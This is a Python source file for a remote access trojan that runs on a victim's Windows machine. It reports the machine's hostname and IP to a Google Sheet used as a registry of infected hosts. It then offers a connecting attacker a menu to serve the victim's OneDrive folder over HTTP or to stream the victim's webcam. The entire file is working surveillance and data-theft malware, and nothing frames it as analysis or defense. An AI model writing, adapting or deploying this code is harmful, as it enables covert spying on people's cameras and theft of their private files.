import http.server
import socket
import socketserver
import os
import cv2
import struct
import pickle
import gspread
from oauth2client.service_account import ServiceAccountCredentials


HOST = socket.gethostbyname(socket.gethostname())
# Connecting to controller on this port
PORT = 8010
# Connecting to webserver on this port
PORT2 = 8888

# SETUP CLIENT-SERVER CONNECTION
server = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
server.bind((HOST,PORT))
server.listen()

def database_entry():
    scope = ['https://spreadsheets.google.com/feeds', 'https://www.googleapis.com/auth/drive']
    credentials_json = {
        # Google spreadsheet API creds
    }
    try:
        credentials = ServiceAccountCredentials.from_json_keyfile_dict(credentials_json, scope)
        # Authenticate with Google Sheets API
        gc = gspread.authorize(credentials)
        # Open the spreadsheet (by title or URL)
        spreadsheet_url = 'https://docs.google.com/spreadsheets/d/18VtJFRIdnrS13vTYKehZRncohnjbPXhJAwIprYfSKeU/edit?usp=sharing' #YEAH IT IS MY GOOGLE SHEET, I DONT THINK YOU CAN DO ANYTHING ABOUT IT
        spreadsheet = gc.open_by_url(spreadsheet_url)
        # Select the worksheet you want to read from
        worksheet = spreadsheet.sheet1 
        # Read data from the worksheet
        data = worksheet.get_all_values()
        for x in data[1:]:
            # print(x[1])
            # print(type(x[1]))
            if x[1] == HOST:    
                print("same")
                continue
            else:
                new_row_values = [socket.gethostname(),HOST, PORT,PORT2,'ONLINE']
                worksheet.append_row(new_row_values)
    except:
        communication_socket.send('No Internet Connection, unable to contact API'.encode('utf-8'))

# FUNCTIONS TO ENTERTAIN CLIENT REQUESTS:

# CLIENT REQUEST 0
def close_connection():
    communication_socket.close()
    x = False
        
# CLIENT REQUEST 1
def access_files():
    # CHANGE DIRECTORY YOU WANT
    desktop = os.path.join(os.path.join(os.environ['USERPROFILE']),'OneDrive')
    os.chdir(desktop)

    # creating a http request
    Handler = http.server.SimpleHTTPRequestHandler

    # finding the IP address of the PC
    link = "http://" + HOST + ":" + str(PORT2)

    # Continuous stream of data between client and server
    with socketserver.TCPServer((HOST, PORT2), Handler) as httpd:
        communication_socket.send(f"Connected on: {HOST}, {PORT2}".encode('utf-8'))
        communication_socket.send(f"File System of victim can be accessed from this link, {link}".encode('utf-8'))
        httpd.serve_forever()

# CLIENT REQUEST 2
def access_webcam():
    communication_socket.send(f"WebCam Initiated at: {HOST}, {PORT}".encode('utf-8'))
    # Capturing Video Frame using CV2:
    vid = cv2.VideoCapture(0)

    # SOCKET ACCEPT:
    while True:
        # READING FRAMES FROM CAMERA
        img, frame = vid.read()
        # USING PICKLE TO SERIALIZE FRAMES TO BYTE DATA
        data = pickle.dumps(frame)
        # PACKING EACH FRAME DATA USNG STRUCT MODULE
        message = struct.pack("L",len(data))+data

        # SENDING THIS PACKED DATA TO CLIENT:
        communication_socket.sendall(message)

        # Wait for a key press and break the loop if 'q' is pressed
        key = cv2.waitKey(1) & 0xFF
        if key == ord('q'):
            break

    # Release the camera and close the sockets
    vid.release()
    communication_socket.close()
    server.close()


def connect_client():
    communication_socket , address = server.accept()
    communication_socket.send(f'I am connected to {socket.gethostname()}'.encode('utf-8'))
    communication_socket.send(f'IP address: {HOST}\n'.encode('utf-8')) 
    return communication_socket, address

x = True
counter = 0
while x == True:
    # Setting up client-server connection
    communication_socket, address = connect_client()
    client_request = None

    # Confguring database 
    if counter == 0: # To make sure this thing happens once only!
        communication_socket.send('Please Wait, configuring database'.encode('utf-8'))
        database_entry()
        communication_socket.send('Success!'.encode('utf-8'))
        counter += 1
    
    available_attack_options = [0,1,2]

    while client_request not in available_attack_options:
        communication_socket.send(f"What Do You Want To Do? \n0)Choose 0 To Close The Communication \n1)Choose 1 for victim's filesystem \n2)Choose 2 for victim's camera".encode('utf-8'))
        communication_socket.send('\nEnter Your INPUT Here: '.encode('utf-8'))
        client_request = int(communication_socket.recv(1024).decode('utf-8'))

    # ENTERTAINING CLIENT'S REQ TO CLOSE THE COMMUNICATION
    if client_request == 0:
        close_connection()
        
    #ENTERTAINING CLIENT'S REQUEST TO ACCESS FILES OF VICTIM:
    elif client_request == 1:
        access_files()

    elif client_request == 2:
        access_webcam() 

    # IN ANYOTHER CASE:
    else:
        # print('case of else!')
        communication_socket.send(f"Sorry Command not Recognised, choose from: , {available_attack_options}".encode('utf-8'))
        
    
    



